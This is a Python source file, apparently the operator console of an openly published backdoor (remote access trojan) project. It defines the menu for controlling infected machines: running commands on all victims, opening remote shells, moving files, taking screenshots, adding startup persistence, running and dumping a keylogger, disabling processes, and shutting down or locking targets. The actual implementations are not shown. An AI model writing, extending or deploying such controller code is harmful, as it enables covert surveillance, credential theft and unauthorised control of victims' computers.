"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

import socket

import src.defs as c
from src.defs import *


def menu_help(_list):
    out = ""

    for i in range(0, len(_list)):
        out += f"{_list[i]['arg']} {_list[i]['info']}"

        if "arg2" in _list[i]:
            out += f" <{_list[i]['arg2']}>"

        if "optional_arg2" in _list[i]:
            out += f" [{_list[i]['optional_arg2']}]"

        if i != len(_list) - 1:
            out += "\n"

    print(f"\n{out}")


def _input(prompt):
    choice = input(prompt)

    if choice == "":
        return choice

    choice = choice.split(" ")

    choice[0] = choice[0].upper()

    if len(choice) > 1:
        choice[1] = choice[1].lower()

    return choice


class View:
    def __init__(self, control):
        self.control = control
        self.main_menu()

    def check_input(self, _input, _list):
        for arg in _list:
            if _input[0] == arg["arg"]:
                if "arg2" in arg and len(_input) < 2:
                    self.control.logger.error(f"Missing argument: {arg['arg2']}")
                    return False
                return True
        self.control.logger.error(f"Command not found, type {MENU_HELP} for Help")
        return False

    def main_menu(self):
        while True:
            choice = _input(">> ")

            if choice == "": continue

            self.control.socket.refresh()

            if self.check_input(choice, SERVER_MAIN_COMMAND_LIST):
                match choice[0]:
                    case c.MENU_HELP:
                        menu_help(SERVER_MAIN_COMMAND_LIST)
                    case c.MENU_LIST_CONNECTIONS:
                        if len(choice) > 1:
                            if choice[1] == MENU_LIST_CONNECTIONS_INACTIVE:
                                print(self.control.socket.list(True))
                            else:
                                self.control.logger.error("Invalid argument")
                        else:
                            print(self.control.socket.list())
                    case c.MENU_SEND_ALL_CMD:
                        self.control.socket.send_all_connections(CLIENT_RUN_CMD, choice[1], recvall=True)
                    case c.MENU_INTERACT:
                        if self.control.interact(choice[1]):
                            self.interact_menu()
                    case c.MENU_CLOSE_CONNECTION:
                        self.control.socket.close_one(choice[1])
                    case c.MENU_CLOSE_ALL:
                        self.control.socket.close_clients()
                    case c.MENU_OPEN_SHELL:
                        self.control.command_shell(choice[1])
                print()

    def interact_menu(self):
        try:
            while True:
                choice = _input("interact>> ")
                self.control.socket.send_json(CLIENT_HEARTBEAT)

                if choice == "": continue

                if self.check_input(choice, SERVER_INTERACT_COMMAND_LIST):
                    match choice[0]:
                        case c.MENU_HELP:
                            menu_help(SERVER_INTERACT_COMMAND_LIST)
                        case c.MENU_INTERACT_MSG:
                            self.control.message(choice[1])
                        case c.MENU_INTERACT_SEND:
                            self.control.send_file()
                        case c.MENU_INTERACT_RECV:
                            self.control.receive_file()
                        case c.MENU_INTERACT_SCRN:
                            self.control.screenshot()
                        case c.MENU_INTERACT_STARTUP:
                            if choice[1] == c.MENU_INTERACT_STARTUP_ADD:
                                self.control.startup()
                            elif choice[1] == c.MENU_INTERACT_STARTUP_RMV:
                                self.control.startup(True)
                            else:
                                self.control.logger.error("Invalid argument")
                        case c.MENU_INTERACT_INFO:
                            self.control.info()
                        case c.MENU_INTERACT_SHELL:
                            self.control.command_shell()
                        case c.MENU_INTERACT_PYTHON:
                            self.control.python_interpreter()
                        case c.MENU_INTERACT_KEYLOG:
                            if choice[1] == c.MENU_INTERACT_KEYLOG_START:
                                self.control.keylogger_start()
                            elif choice[1] == c.MENU_INTERACT_KEYLOG_STOP:
                                self.control.keylogger_stop()
                            elif choice[1] == c.MENU_INTERACT_KEYLOG_DUMP:
                                self.control.keylogger_dump()
                            else:
                                self.control.logger.error("Invalid argument")
                        case c.MENU_INTERACT_DISABLE_PROCESS:
                            self.control.toggle_disable_process(choice[1])
                        case c.MENU_INTERACT_SHUT:
                            if choice[1] == c.MENU_INTERACT_SHUT_SHUTDOWN:
                                self.control.shutdown()
                                break
                            elif choice[1] == c.MENU_INTERACT_SHUT_RESTART:
                                self.control.restart()
                                break
                            elif choice[1] == c.MENU_INTERACT_SHUT_LOCK:
                                self.control.lock()
                            else:
                                self.control.logger.error("Invalid argument")
                        case c.MENU_INTERACT_BACKGROUND:
                            self.control.socket.socket = None
                            break
                        case c.MENU_INTERACT_CLOSE:
                            self.control.socket.close()
                            break
                    print()

        except socket.error as e:  # if there is a socket error
            self.control.logger.error(f"Connection was lost {e}")
